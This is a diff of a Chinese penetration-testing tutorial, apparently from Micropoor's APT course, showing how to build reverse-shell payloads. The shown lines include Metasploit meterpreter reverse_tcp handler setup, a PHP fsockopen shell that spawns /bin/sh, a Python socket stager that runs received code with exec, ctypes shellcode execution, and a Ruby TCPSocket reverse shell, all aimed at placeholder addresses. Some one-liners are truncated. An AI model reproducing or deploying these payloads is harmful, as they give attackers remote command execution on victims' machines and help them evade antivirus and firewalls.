@@ -1,13 +1,10 @@
-专注APT攻击与防御
-https://micropoor.blogspot.com/
+在实战中可能会遇到各种诉求 payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
 
-在实战中可能会遇到各种诉求payload，并且可能遇到各种实际问题，如杀毒软件，防火墙拦截，特定端口通道，隧道等问题。这里我们根据第十课补充其中部分，其他内容后续补充。
-
-这次主要补充了PHP，python，ruby。
+这次主要补充了 PHP，python，ruby。
 
 ps:在线代码高亮：http://tool.oschina.net/highlight
 
-**1.php-payload**
+### 1、php-payload
 ```bash
 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
@@ -32,7 +29,7 @@ $sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 ![](media/107730c867318d074cc21b9b490d8e8d.jpg)
 
-**2.python-payload**
+### 2、python-payload
 ```bash
 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp 
@@ -53,10 +50,14 @@ d=s.recv(l)
 while len(d)<l: 
     d+=s.recv(l-len(d))
 exec(d,{'s':s})
-```
+```  
 ![](media/56fa0d76a0ef5b598d14f8a67de449b7.jpg)
 
-`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",xx));i"]);`
+```python
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",xx));
+i"]);
+```  
 ![](media/268f5cbb31121e9d7f37909587296e7a.jpg)
 
 ```python
@@ -83,7 +84,7 @@ shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))
 shellcode()
 ```
 
-**2.ruby-payload**
+### 2、ruby-payload
 ```ruby
 require 'socket';c=TCPSocket.new("xx.xx.xx.xx", x);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdi
 (IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil}
